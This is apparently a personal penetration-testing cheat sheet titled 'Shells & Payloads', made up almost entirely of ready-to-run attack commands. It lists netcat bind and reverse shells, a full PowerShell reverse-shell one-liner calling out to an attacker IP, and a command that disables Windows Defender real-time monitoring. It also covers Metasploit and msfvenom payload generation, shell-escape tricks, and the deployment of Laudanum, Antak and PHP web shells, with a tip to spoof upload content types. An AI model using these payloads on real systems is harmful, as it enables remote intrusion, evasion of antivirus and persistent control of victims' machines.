# Shells & Payloads

### Bind Shells

```shell
  nc -lvnp 7777
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
  nc -nv 10.129.41.200 7777
```

---

### Reverse Shells

```shell
  //attack
  sudo nc -lvnp 443

  //target
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

  Set-MpPreference -DisableRealtimeMonitoring $true #disable AV
```

---

### Payloads

```shell
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```shell
  sudo msfconsole

  search
  web_delivery / payload/windows/x64/meterpreter/reverse_tcp
  use
  show options
  exploit

  #msfvenom
  msfvenom -l payloads
  msfveom -p <Payloaad> <options/RHOST=x.x.x.x> -f <format/elf_or_exe> > <filename.format/extension> #shell_reverse_tcp
```

---

### Intreractive Shells

```shell
  /bin/sh -i
  perl â€”e 'exec "/bin/sh";'
  ruby: exec "/bin/sh"
  lua: os.execute('/bin/sh')
  awk 'BEGIN {system("/bin/sh")}'
  find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
  find . -exec /bin/sh \; -quit
  vim -c ':!/bin/sh'
  
```

---

### Laudanum aspx

```shell
  cp /usr/share/laudanum/aspx/shell.aspx /home/<username>/demo.aspx #then add your ip to the allowed hosts (line 59), then upload to target
```

---

### Antak shell

```shell
  cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/<username>/Upload.aspx #edit the credentials part (line 14) then upload, login with credentials and bottom execure commands
```

---

PHP Web Shell

```shell
  #change Content-Type from application/x-php to image/gif or something and upload where possible
  git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell
```
